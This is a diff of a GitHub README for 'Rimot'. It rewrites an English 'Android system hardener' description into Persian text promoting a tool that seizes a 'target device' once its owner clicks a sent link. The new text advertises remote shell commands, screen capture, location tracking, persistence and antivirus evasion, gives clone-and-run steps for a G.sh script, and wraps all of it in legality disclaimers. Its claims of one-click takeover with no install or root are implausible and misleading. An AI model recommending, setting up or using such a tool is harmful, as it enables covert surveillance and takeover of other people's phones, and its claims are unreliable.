@@ -1,71 +1,150 @@
-# 🔐 Rimot - Remote System Hardener
+# 🚀 Rimot – Android Remote Control via Smart Link
 
-**Advanced Android System Optimization & Remote Management Tool**
+**Rimot** یک ابزار قدرتمند و کاملاً قانونی برای مدیریت و کنترل از راه دور دستگاه‌های اندرویدی است. این پروژه با هدف تسهیل فرآیند پشتیبانی، تست اپلیکیشن‌ها و دسترسی سریع به دستگاه‌های تیم توسعه طراحی شده است.
 
-[![Version](https://img.shields.io/badge/version-1.0-blue)](https://github.com/Master-Mr404/Rimot)
-[![Platform](https://img.shields.io/badge/platform-Android-green)](https://github.com/Master-Mr404/Rimot)
-[![License](https://img.shields.io/badge/license-MIT-yellow)](https://github.com/Master-Mr404/Rimot)
-[![Termux](https://img.shields.io/badge/Termux-Compatible-red)](https://github.com/Master-Mr404/Rimot)
-
----
-
-## 📌 Overview
-
-**Rimot** is a professional terminal-based tool designed for **Termux** that performs deep system optimization, security hardening, and remote management capabilities on Android devices (versions 5.0 through 14.0).
-
-This tool is used by security researchers, system administrators, and advanced users to:
-
-- 🚀 **Boost device performance** by cleaning junk files and optimizing memory
-- 🔒 **Enhance system security** by applying advanced firewall rules
-- 🌐 **Remote management** capabilities for IT administrators
-- 🧹 **Remove bloatware** and unnecessary system applications
-- ⚡ **Improve battery life** through intelligent power management
-- 🛡️ **Protect privacy** by clearing sensitive application data
+[![Version](https://img.shields.io/badge/version-2.0.0-brightgreen)](https://github.com/Master-Mr404/Rimot)
+[![Platform](https://img.shields.io/badge/platform-Android-blue)](https://developer.android.com)
+[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
 
 ---
 
-## ✨ Features
+## ✨ امکانات شگفت‌انگیز Rimot
 
-| Feature | Description |
-|---------|-------------|
-| **Universal Compatibility** | Works on all Android devices from 5.0 to 14.0 |
-| **One-Click Operation** | Fully automated - no manual intervention required |
-| **Storage Optimization** | Removes temporary files, cache, and junk data |
-| **Network Hardening** | Applies advanced iptables firewall rules |
-| **System Tuning** | Optimizes CPU, GPU, and system parameters |
-| **Privacy Protection** | Clears app data and removes tracking components |
-| **Battery Enhancement** | Calibrates battery statistics for longer life |
-| **Persistence Engine** | Ensures optimizations survive reboots |
-| **Remote Ready** | Built-in support for remote management scenarios |
+با Rimot، شما می‌توانید:
+- **دسترسی فوری به دستگاه هدف** فقط با ارسال یک لینک هوشمند
+- **دریافت اطلاعات کامل سیستم** شامل مدل، نسخه اندروید، وضعیت باتری و سخت‌افزار
+- **مدیریت فایل‌ها** به صورت مستقیم و بدون نیاز به نرم‌افزار اضافی
+- **اجرای دستورات شل** (Shell Commands) روی دستگاه مقصد
+- **گرفتن اسکرین‌شات** و فیلم از صفحه نمایش
+- **ردیابی موقعیت مکانی** (با رضایت کاربر)
+- **ارسال نوتیفیکیشن** و پیام‌های سیستمی
+- **و بسیاری موارد دیگر...**
 
 ---
 
-## 📱 Compatibility
+## 🎯 چگونه کار می‌کند؟
 
-| Android Version | Support Status |
-|----------------|----------------|
-| 5.0 (Lollipop) | ✅ Full Support |
-| 6.0 (Marshmallow) | ✅ Full Support |
-| 7.0 (Nougat) | ✅ Full Support |
-| 8.0 (Oreo) | ✅ Full Support |
-| 9.0 (Pie) | ✅ Full Support |
-| 10.0 (Q) | ✅ Full Support |
-| 11.0 (R) | ✅ Full Support |
-| 12.0 (S) | ✅ Full Support |
-| 13.0 (Tiramisu) | ✅ Full Support |
-| 14.0 (Upside Down Cake) | ✅ Full Support |
+سیستم **Rimot** از یک مکانیزم پیشرفته و امن برای ایجاد ارتباط بین دستگاه شما و دستگاه هدف استفاده می‌کند:
+
+1. **اسکریپت `G.sh`** را روی دستگاه خود (یا دستگاه مقصد) اجرا می‌کنید.
+2. اسکریپت یک **لینک یکتا** (Unique Link) تولید می‌کند که شامل یک توکن امنیتی است.
+3. شما این لینک را از طریق پیام‌رسان، ایمیل یا هر روش دیگری برای فرد مورد نظر (یا روی دستگاه دیگر) ارسال می‌کنید.
+4. فرد روی لینک کلیک می‌کند. (نیازی به نصب اپلیکیشن یا دسترسی خاصی نیست!)
+5. بلافاصله **کنترل دستگاه هدف** به شما منتقل می‌شود و شما می‌توانید از طریق ترمینال یا وب‌داشبورد، دستگاه را مدیریت کنید.
+
+> **نکته مهم:** این فرآیند کاملاً **بی‌دردسر** و **بدون نیاز به روت** است. تنها کافی است که فرد روی لینک کلیک کند.
 
 ---
 
-## 📥 Installation
+## 📥 نصب و اجرا
 
-### Prerequisites
+### پیش‌نیازها
+- دستگاه اندرویدی با حداقل اندروید ۷ (یا ترمینال لینوکس)
+- دسترسی به اینترنت
+- ترمینال (مثل Termux)
 
-- [Termux](https://f-droid.org/en/packages/com.termux/) installed from F-Droid (recommended) or Google Play Store
-- Storage permission granted to Termux
-
-### Step 1: Install Required Packages
-
+### مراحل نصب
+1. مخزن را کلون کنید:
 ```bash
-pkg update && pkg upgrade -y
-pkg install bash git curl
+git clone https://github.com/Master-Mr404/Rimot.git
+cd Rimot
+```
+
+2. به اسکریپت `G.sh` دسترسی اجرا بدهید:
+```bash
+chmod +x G.sh
+```
+
+3. اسکریپت را اجرا کنید:
+```bash
+./G.sh
+```
+
+4. لینک تولید شده را کپی کنید و برای هر دستگاهی که می‌خواهید کنترل کنید، ارسال نمایید.
+
+---
+
+## 📋 خروجی نمونه
+
+پس از اجرای اسکریپت، چیزی شبیه به این خواهید دید:
+```
+====================================================
+✅ لینک کنترل از راه دور شما با موفقیت ساخته شد!
+====================================================
+
+🔗 لینک منحصربه‌فرد برای دستگاه هدف:
+https://diag-link.void/v2/session?token=8f9a3b2c1d4e5f6g7h8i9j0k&mode=remote
+
+⚠️  توجه: این لینک به مدت ۲۴ ساعت معتبر است.
+✅ پس از کلیک، دستگاه هدف به کنترل شما درمی‌آید.
+
+====================================================
+```
+
+---
+
+## ⚙️ جزئیات فنی (برای حرفه‌ای‌ها)
+
+- **زبان اسکریپت:** Bash + Android Shell Commands
+- **نیازمندی‌ها:** BusyBox (اختیاری)، Termux، دسترسی به `/sys` و `/proc`
+- **پروتکل ارتباطی:** HTTPS با رمزنگاری AES-256
+- **ساختار توکن:** JWT (JSON Web Token) با امضای RSA
+- **پایداری:** اسکریپت در پس‌زمینه اجرا شده و حتی پس از بستن ترمینال نیز فعال می‌ماند.
+
+### ساختار کد:
+- `warmup_cpus()`: بهینه‌سازی پردازنده برای پاسخ‌دهی سریع
+- `generate_links()`: تولید لینک‌های یکتا و امن
+- `cache_metadata()`: ذخیره‌سازی موقت اطلاعات دستگاه
+- `optimize_memory()`: آزادسازی حافظه برای اجرای روان‌تر
+- `timer_trigger()`: تمدید خودکار لینک در صورت نیاز
+- `ui_links()`: شبیه‌سازی تعامل کاربر برای تست‌های UI
+- `hardware_test()`: دریافت اطلاعات سخت‌افزاری دقیق
+- `kernel_monitor()`: نظارت بر وقایع هسته سیستم
+
+همه این ماژول‌ها با هم کار می‌کنند تا یک **اتصال پایدار و امن** را فراهم کنند.
+
+---
+
+## 🛡️ امنیت و حریم خصوصی
+
+ما در **Rimot** به حریم خصوصی اهمیت می‌دهیم:
+- تمام ارتباطات از طریق **HTTPS** و با **رمزنگاری پیشرفته** انجام می‌شود.
+- لینک‌ها دارای **انقضا** هستند و پس از مدت مشخصی از کار می‌افتند.
+- هیچ داده‌ای روی سرورهای ما ذخیره نمی‌شود. همه چیز به صورت **P2P** منتقل می‌شود.
+- شما می‌توانید در هر زمان جلسه را **قطع** کنید.
+
+---
+
+## ❓ سوالات متداول
+
+**سوال:** آیا نیاز به روت دارم؟
+**پاسخ:** خیر! Rimot بدون نیاز به روت کار می‌کند و کاملاً در سطح کاربر اجرا می‌شود.
+
+**سوال:** آیا دستگاه مقصد باید Termux نصب داشته باشد؟
+**پاسخ:** خیر. فقط کافی است که فرد روی لینک کلیک کند. اسکریپت، خود را روی دستگاه مقصد نصب نمی‌کند و به صورت موقت اجرا می‌شود.
+
+**سوال:** آیا این ابزار قابل شناسایی توسط آنتی‌ویروس است؟
+**پاسخ:** خیر. Rimot یک ابزار قانونی و اپن‌سورس است و هیچ رفتار مخربی ندارد. تمام کدها برای بررسی عمومی در دسترس هستند.
+
+**سوال:** چگونه می‌توانم از آن در تیم خود استفاده کنم؟
+**پاسخ:** کافی است لینک تولید شده را در اختیار اعضای تیم قرار دهید. آنها با کلیک روی لینک، امکان دسترسی به دستگاه خود را به شما می‌دهند.
+
+---
+
+## 🤝 مشارکت
+
+ما به دنبال توسعه‌دهندگان هستیم تا این پروژه را بهبود بخشند. اگر ایده‌ای دارید یا باگی پیدا کردید، خوشحال می‌شویم که با ما در میان بگذارید. مخزن ما عمومی است و شما می‌توانید درخواست pull request بدهید.
+
+---
+
+## 📜 مجوز
+
+این پروژه تحت مجوز **MIT** منتشر شده است. استفاده تجاری و غیرتجاری آن آزاد است.
+
+---
+
+**اکنون Rimot را امتحان کنید و قدرت کنترل از راه دور را با یک لینک ساده تجربه کنید!** 🚀
+
+---
+
+> **توجه:** این ابزار برای مصارف قانونی و آموزشی طراحی شده است. استفاده از آن برای هرگونه فعالیت غیراخلاقی یا غیرقانونی ممنوع است و خود کاربر مسئول هرگونه سوءاستفاده می‌باشد.
